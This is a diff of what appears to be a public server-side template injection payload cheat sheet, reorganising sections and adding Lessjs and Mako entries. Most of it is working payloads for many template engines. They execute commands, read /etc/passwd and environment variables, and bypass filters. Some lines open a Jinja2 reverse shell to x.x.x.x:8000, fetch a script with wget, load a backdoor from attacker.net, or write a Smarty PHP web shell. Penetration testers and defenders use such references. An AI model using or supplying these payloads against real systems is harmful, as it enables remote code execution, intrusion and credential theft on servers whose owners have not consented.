@@ -6,32 +6,21 @@
 
 * [Tools](#tools)
 * [Methodology](#methodology)
-* [Ruby](#ruby)
-  * [Basic injections](#ruby---basic-injections)
-  * [Retrieve /etc/passwd](#ruby---retrieve--etc-passwd)
-  * [List files and directories](#ruby---list-files-and-directories)
-* [Java](#java)
-  * [Basic injection](#java---basic-injection)
-  * [Retrieve the system’s environment variables](#java---retrieve-the-system-s-environment-variables)
-  * [Retrieve /etc/passwd](#java---retrieve--etc-passwd)
+* [ASP.NET Razor](#aspnet-razor)
+  * [Basic injection](#aspnet-razor---basic-injection)
+  * [Command execution](#aspnet-razor---command-execution)
 * [Expression Language EL](#expression-language-el)
   * [Basic injection](#expression-language-el---basic-injection)
   * [Code execution](#expression-language-el---code-execution)
-* [Twig](#twig)
-  * [Basic injection](#twig---basic-injection)
-  * [Template format](#twig---template-format)
-  * [Arbitrary File Reading](#twig---arbitrary-file-reading)
-  * [Code execution](#twig---code-execution)
-* [Smarty](#smarty)
 * [Freemarker](#freemarker)
   * [Basic injection](#freemarker---basic-injection)
   * [Code execution](#freemarker---code-execution)
-* [Pebble](#pebble)
-  * [Basic injection](#pebble---basic-injection)
-  * [Code execution](#pebble---code-execution)
-* [Jade / Codepen](#jade---codepen)
-* [Velocity](#velocity)
-* [Mako](#mako)
+* [Handlebars](#handlebars)
+* [Jade / Codepen](#jade--codepen)
+* [Java](#java)
+  * [Basic injection](#java---basic-injection)
+  * [Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
+  * [Retrieve /etc/passwd](#java---retrieve-etcpasswd)
 * [Jinja2](#jinja2)
   * [Basic injection](#jinja2---basic-injection)
   * [Template format](#jinja2---template-format)
@@ -45,10 +34,22 @@
 * [Jinjava](#jinjava)
   * [Basic injection](#jinjava---basic-injection)
   * [Command execution](#jinjava---command-execution)
-* [Handlebars](#handlebars)
-* [ASP.NET Razor](#aspnet-razor)
-  * [Basic injection](#aspnet-razor---basic-injection)
-  * [Command execution](#aspnet-razor---command-execution)
+* [Lessjs](#lessjs)
+* [Mako](#mako)
+* [Pebble](#pebble)
+  * [Basic injection](#pebble---basic-injection)
+  * [Code execution](#pebble---code-execution)
+* [Ruby](#ruby)
+  * [Basic injections](#ruby---basic-injections)
+  * [Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
+  * [List files and directories](#ruby---list-files-and-directories)
+* [Smarty](#smarty)
+* [Twig](#twig)
+  * [Basic injection](#twig---basic-injection)
+  * [Template format](#twig---template-format)
+  * [Arbitrary File Reading](#twig---arbitrary-file-reading)
+  * [Code execution](#twig---code-execution)
+* [Velocity](#velocity)
 * [References](#references)
 
 ## Tools
@@ -66,90 +67,52 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)
 
-## Ruby
+---
 
-### Ruby - Basic injections
+## ASP.NET Razor
 
-ERB:
+[Official website](https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c)
+> Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.
 
-```ruby
-<%= 7 * 7 %>
-```
-
-Slim:
-
-```ruby
-#{ 7 * 7 }
-```
-
-### Ruby - Retrieve /etc/passwd
-
-```ruby
-<%= File.open('/etc/passwd').read %>
-```
-
-### Ruby - List files and directories
-
-```ruby
-<%= Dir.entries('/') %>
-```
-
-### Ruby - Code execution
-
-Execute code using SSTI for ERB engine.
-
-```ruby
-<%= system('cat /etc/passwd') %>
-<%= `ls /` %>
-<%= IO.popen('ls /').readlines()  %>
-<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
-<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
-```
-
-
-Execute code using SSTI for Slim engine.
+### ASP.NET Razor - Basic injection
 
 ```powershell
-#{ %x|env| }
+@(1+2)
 ```
 
-## Java
+### ASP.NET Razor - Command execution
 
-### Java - Basic injection
-
-```java
-${7*7}
-${{7*7}}
-${class.getClassLoader()}
-${class.getResource("").getPath()}
-${class.getResource("../../../../../index.htm").getContent()}
+```csharp
+@{
+  // C# code
+}
 ```
 
-### Java - Retrieve the system’s environment variables
-
-```java
-${T(java.lang.System).getenv()}
-```
-
-### Java - Retrieve /etc/passwd
-
-```java
-${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
-
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
-```
+---
 
 ## Expression Language EL
+
+[Official website](https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html)
+> Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0
 
 ### Expression Language EL - Basic injection
 
 ```java
-${1+1} 
+${1+1}
 #{1+1}
 ```
 
-### Expression Language EL - Code Execution
+### Expression Language EL - One-Liner injections not including code execution
 
+```java
+// DNS Lookup
+${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
+
+// JVM System Property Lookup (ex: java.class.path)
+${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
+```
+
+### Expression Language EL - Code Execution
 
 ```java
 // Common RCE payloads
@@ -179,73 +142,18 @@ ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().g
 ${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
 ```
 
-
-## Twig
-
-### Twig - Basic injection
-
-```python
-{{7*7}}
-{{7*'7'}} would result in 49
-{{dump(app)}}
-{{app.request.server.all|join(',')}}
-```
-
-### Twig - Template format
-
-```python
-$output = $twig > render (
-  'Dear' . $_GET['custom_greeting'],
-  array("first_name" => $user.first_name)
-);
-
-$output = $twig > render (
-  "Dear {first_name}",
-  array("first_name" => $user.first_name)
-);
-```
-
-### Twig - Arbitrary File Reading
-
-```python
-"{{'/etc/passwd'|file_excerpt(1,30)}}"@
-```
-
-### Twig - Code execution
-
-```python
-{{self}}
-{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-{{['id']|filter('system')}}
-{{['cat\x20/etc/passwd']|filter('system')}}
-{{['cat$IFS/etc/passwd']|filter('system')}}
-```
-
-Example with an email passing FILTER_VALIDATE_EMAIL PHP.
-
-```powershell
-POST /subscribe?0=cat+/etc/passwd HTTP/1.1
-email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
-```
-
-## Smarty
-
-```python
-{$smarty.version}
-{php}echo `id`;{/php} //deprecated in smarty v3
-{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
-{system('ls')} // compatible v3
-{system('cat index.php')} // compatible v3
-```
+---
 
 ## Freemarker
+
+[Official website](https://freemarker.apache.org/)
+> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. 
 
 You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)
 
 ### Freemarker - Basic injection
 
-The template can be `${3*3}` or the legacy `#{3*3}`
+The template can be `${3*3}` or the legacy `#{3*3}`.
 
 ### Freemarker - Code execution
 
@@ -267,36 +175,43 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ${dwf.newInstance(ec,null)("id")}
 ```
 
-## Pebble
+---
 
-### Pebble - Basic injection
+## Handlebars
 
-```java
-{{ someString.toUPPERCASE() }}
+[Official website](https://handlebarsjs.com/)
+> Handlebars compiles templates into JavaScript functions.
+
+### Handlebars - Command Execution
+
+```handlebars
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('ls -la');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
 ```
 
-### Pebble - Code execution
-
-Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.
-
-New version of Pebble :
-
-```java
-{% set cmd = 'id' %}
-{% set bytes = (1).TYPE
-     .forName('java.lang.Runtime')
-     .methods[6]
-     .invoke(null,null)
-     .exec(cmd)
-     .inputStream
-     .readAllBytes() %}
-{{ (1).TYPE
-     .forName('java.lang.String')
-     .constructors[0]
-     .newInstance(([bytes]).toArray()) }}
-```
+---
 
 ## Jade / Codepen
+
+[Official website](https://codepen.io/)
+> 
 
 ```python
 - var x = root.process
@@ -309,32 +224,39 @@ New version of Pebble :
 #{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
 ```
 
-## Velocity
+---
 
-```python
-#set($str=$class.inspect("java.lang.String").type)
-#set($chr=$class.inspect("java.lang.Character").type)
-#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])
-$str.valueOf($chr.toChars($out.read()))
-#end
+## Java
+
+### Java - Basic injection
+
+```java
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
 ```
 
-## Mako
+### Java - Retrieve the system’s environment variables
 
-```python
-<%
-import os
-x=os.popen('id').read()
-%>
-${x}
+```java
+${T(java.lang.System).getenv()}
 ```
+
+### Java - Retrieve /etc/passwd
+
+```java
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+```
+
+---
 
 ## Jinja2
 
-[Official website](http://jinja.pocoo.org/)
+[Official website](https://jinja.palletsprojects.com/)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
 
 ### Jinja2 - Basic injection
@@ -346,7 +268,7 @@ ${x}
 ```
 
 Jinja2 is used by Python Web Frameworks such as Django or Flask.
-The above injections have been tested on Flask application.
+The above injections have been tested on a Flask application.
 
 ### Jinja2 - Template format
 
@@ -413,7 +335,32 @@ Listen for connection
 nc -lnvp 8000
 ```
 
-#### Exploit the SSTI by calling subprocess.Popen.
+#### Exploit the SSTI by calling os.popen().read()
+
+These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
+
+```python
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+We can use these shorter payloads (this is the shorter payloads known yet):
+
+```python
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+
+#### Exploit the SSTI by calling subprocess.Popen
+
 :warning: the number 396 will vary depending of the application.
 
 ```python
@@ -438,15 +385,14 @@ In another GET parameter include a variable named "input" that contains the comm
 
 ```python
 # evil config
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
 
 # load the evil config
 {{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
 
 # connect to evil host
-{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
 ```
-
 
 ### Jinja2 - Filter bypass
 
@@ -486,7 +432,12 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 
+---
+
 ## Jinjava
+
+[Official website](https://github.com/HubSpot/jinjava)
+> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).
 
 ### Jinjava - Basic injection
 
@@ -497,7 +448,7 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 
 Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
 
-### Jinjava - Command execution 
+### Jinjava - Command execution
 
 Fixed by https://github.com/HubSpot/jinjava/pull/230
 
@@ -508,51 +459,322 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 
-
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 ```
 
-## Handlebars
+---
 
-### Handlebars - Command Execution
+## Lessjs
 
-```handlebars
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').execSync('ls -la');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
+[Official website](https://lesscss.org/)
+> Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.
+
+### Lessjs - SSRF / LFI
+
+```less
+@import (inline) "http://localhost";
+// or
+@import (inline) "/etc/passwd";
 ```
 
-## ASP.NET Razor
+### Lessjs < v3 - Command Execution
 
-### ASP.NET Razor - Basic injection
-
-```powershell
-@(1+2)
-```
-
-### ASP.NET Razor - Command execution 
-
-```csharp
-@{
-  // C# code
+```less
+body {
+  color: `global.process.mainModule.require("child_process").execSync("id")`;
 }
 ```
+
+### Plugins
+
+Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.
+
+```less
+// example local plugin usage
+@plugin "plugin-2.7.js";
+```
+or
+```less
+// example remote plugin usage
+@plugin "http://example.com/plugin-2.7.js"
+```
+
+version 2 example RCE plugin:
+
+```javascript
+functions.add('cmd', function(val) {
+  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
+});
+```
+version 3 and above example RCE plugin
+
+```javascript
+//Vulnerable plugin (3.13.1)
+registerPlugin({
+    install: function(less, pluginManager, functions) {
+        functions.add('cmd', function(val) {
+            return global.process.mainModule.require('child_process').execSync(val.value).toString();
+        });
+    }
+})
+```
+
+---
+
+## Mako
+
+[Official website](https://www.makotemplates.org/)
+> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.
+
+```python
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+```
+
+### Direct access to os from TemplateNamespace:
+
+Any of these payloads allows direct access to the `os` module
+
+```python
+${self.module.cache.util.os.system("id")}
+${self.module.runtime.util.os.system("id")}
+${self.template.module.cache.util.os.system("id")}
+${self.module.cache.compat.inspect.os.system("id")}
+${self.__init__.__globals__['util'].os.system('id')}
+${self.template.module.runtime.util.os.system("id")}
+${self.module.filters.compat.inspect.os.system("id")}
+${self.module.runtime.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.util.os.system("id")}
+${self.template.__init__.__globals__['os'].system('id')}
+${self.module.cache.util.compat.inspect.os.system("id")}
+${self.module.runtime.util.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.util.os.system("id")}
+${self.template.module.cache.compat.inspect.os.system("id")}
+${self.module.cache.compat.inspect.linecache.os.system("id")}
+${self.template._mmarker.module.runtime.util.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
+${self.template.module.filters.compat.inspect.os.system("id")}
+${self.template.module.runtime.compat.inspect.os.system("id")}
+${self.module.filters.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.exceptions.util.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
+${self.context._with_template.module.cache.util.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.template.module.cache.util.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.util.os.system("id")}
+${self.module.cache.util.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.util.compat.inspect.os.system("id")}
+${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
+${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
+${self.template.module.cache.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
+${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.filters.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
+${self.context._with_template._mmarker.module.cache.util.os.system("id")}
+${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
+${self.context._with_template.module.cache.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
+${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
+${self.context._with_template.module.filters.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
+```
+
+PoC :
+
+```python
+>>> print(Template("${self.module.cache.util.os}").render())
+<module 'os' from '/usr/local/lib/python3.10/os.py'>
+```
+
+Source [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
+
+
+---
+
+## Pebble
+
+[Official website](https://pebbletemplates.io/)
+> Pebble is a Java templating engine inspired by [Twig](./#twig) and similar to the Python [Jinja](./#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.
+
+### Pebble - Basic injection
+
+```java
+{{ someString.toUPPERCASE() }}
+```
+
+### Pebble - Code execution
+
+Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.
+
+New version of Pebble :
+
+```java
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName('java.lang.String')
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}
+```
+
+---
+
+## Ruby
+
+### Ruby - Basic injections
+
+ERB:
+
+```ruby
+<%= 7 * 7 %>
+```
+
+Slim:
+
+```ruby
+#{ 7 * 7 }
+```
+
+### Ruby - Retrieve /etc/passwd
+
+```ruby
+<%= File.open('/etc/passwd').read %>
+```
+
+### Ruby - List files and directories
+
+```ruby
+<%= Dir.entries('/') %>
+```
+
+### Ruby - Code execution
+
+Execute code using SSTI for ERB engine.
+
+```ruby
+<%= system('cat /etc/passwd') %>
+<%= `ls /` %>
+<%= IO.popen('ls /').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
+```
+
+Execute code using SSTI for Slim engine.
+
+```powershell
+#{ %x|env| }
+```
+
+---
+
+## Smarty
+
+[Official website](https://www.smarty.net/docs/en/)
+> Smarty is a template engine for PHP.
+
+```python
+{$smarty.version}
+{php}echo `id`;{/php} //deprecated in smarty v3
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('ls')} // compatible v3
+{system('cat index.php')} // compatible v3
+```
+
+---
+
+## Twig
+
+[Official website](https://twig.symfony.com/)
+> Twig is a modern template engine for PHP.
+
+### Twig - Basic injection
+
+```python
+{{7*7}}
+{{7*'7'}} would result in 49
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+```
+
+### Twig - Template format
+
+```python
+$output = $twig > render (
+  'Dear' . $_GET['custom_greeting'],
+  array("first_name" => $user.first_name)
+);
+
+$output = $twig > render (
+  "Dear {first_name}",
+  array("first_name" => $user.first_name)
+);
+```
+
+### Twig - Arbitrary File Reading
+
+```python
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+```
+
+### Twig - Code execution
+
+```python
+{{self}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+```
+
+Example with an email passing FILTER_VALIDATE_EMAIL PHP.
+
+```powershell
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
+```
+
+---
+
+## Velocity
+
+[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
+> Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.
+
+```python
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
+```
+
+---
 
 ## References
 
@@ -575,3 +797,4 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
 * [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
 * [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+* [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
